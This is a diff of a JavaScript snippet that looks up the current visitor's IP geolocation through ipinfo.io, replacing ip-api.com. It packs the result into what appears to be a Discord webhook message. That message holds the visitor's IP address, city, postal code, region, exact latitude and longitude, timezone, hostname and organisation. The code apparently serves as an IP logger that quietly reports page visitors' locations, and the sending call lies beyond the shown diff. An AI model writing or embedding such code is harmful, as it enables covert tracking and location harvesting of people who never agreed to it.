@@ -1,47 +1,36 @@
-$.getJSON('http://ip-api.com/json', function(data) {
+$.getJSON('https://ipinfo.io/json', function(data) {
+    const coordinates = data.loc.split(",")
     const post = {
         "content": null,
         "embeds": [
           {
-            "title": "`" + data.query + "`",
+            "title": "`" + data.ip + "` (" + data.country + ")",
             "color": null,
             "fields": [
               {
-                "name": "Status",
-                "value": data.status + " "
-              },
-              {
-                "name": "Country (" + data.countryCode + ")",
-                "value": data.country + " "
-              },
-              {
-                "name": "Region (" + data.region + ")",
-                "value": data.regionName + " "
-              },
-              {
                 "name": "City",
-                "value":  data.city + " (" + data.zip + ")"
+                "value": data.city + " (" + data.postal + ")"
+              },
+              {
+                "name": "Region",
+                "value": data.region+ " "
               },
               {
                 "name": "Coordinates",
-                "value": "Latitude: `" + data.lat + "`\nLongtitude: `" + data.lon + "`"
+                "value": "Latitude: `" + coordinates[0] + "`\nLongtitude: `" + coordinates[1] + "`"
               },
               {
                 "name": "Timezone",
                 "value": data.timezone + " "
               },
               {
-                "name": "Internet Service Provider",
-                "value": data.isp + " "
+                "name": "Hostname",
+                "value": data.hostname + " "
               },
               {
                 "name": "Organization",
                 "value": data.org + " "
               },
-              {
-                "name": "Autonomous System",
-                "value": data.as + " "
-              }
             ]
           }
         ],
